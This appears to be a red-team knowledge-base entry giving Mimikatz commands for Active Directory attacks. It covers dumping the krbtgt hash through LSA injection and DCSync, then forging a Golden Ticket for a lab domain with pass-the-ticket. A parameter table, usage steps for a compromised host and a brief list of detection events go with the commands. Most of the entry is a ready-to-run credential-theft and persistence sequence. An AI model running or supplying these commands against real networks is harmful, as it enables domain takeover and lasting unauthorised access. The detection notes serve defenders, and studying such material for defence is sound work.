---
id: 695aa9bc-27ed-4544-89a0-272afe249e22
name: Mimikatz-Commands-for-Golden-Ticket-Forging
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:04.701284+00:00'
updated_at: '2023-04-10T20:26:19.929813+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - golden-ticket
  - kerberos
validated: true
---

# Mimikatz-Commands-for-Golden-Ticket-Forging

## Code

```cmd
# Get info - Mimikatz
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt

# Forge a Golden ticket - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

## Description

This sequence of Mimikatz commands extracts the krbtgt hash and forges a Golden Ticket for persistent domain access in Active Directory environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /user:evil | Forged username | evil |
| /domain:pentestlab.local | Target domain | pentestlab.local |
| /sid:S-1-5-21-... | Domain SID | S-1-5-21-3737340914-2019594255-2413685307 |
| /krbtgt:d125e4... | krbtgt NTLM hash | d125e4f69c851529045ec95ca80fa37e |
| /ticket:evil.tck | Output ticket file | evil.tck |

## Usage

Run these commands sequentially in an elevated Mimikatz session on a compromised domain-joined Windows machine. Use after obtaining DA privileges to simulate full domain compromise. The final TGT can be used for Pass-the-Ticket attacks.

## Detection

- Monitor for DCSync (Event ID 4662, replication from non-DC).
- Anomalous Kerberos tickets with long lifetimes (Event ID 4769).
- Mimikatz process signatures or LSASS access patterns (Sysmon Event ID 10).

## Related

- [[procedures/Golden-Ticket-Attack-with-Mimikatz]]
- [[tools/Mimikatz]]
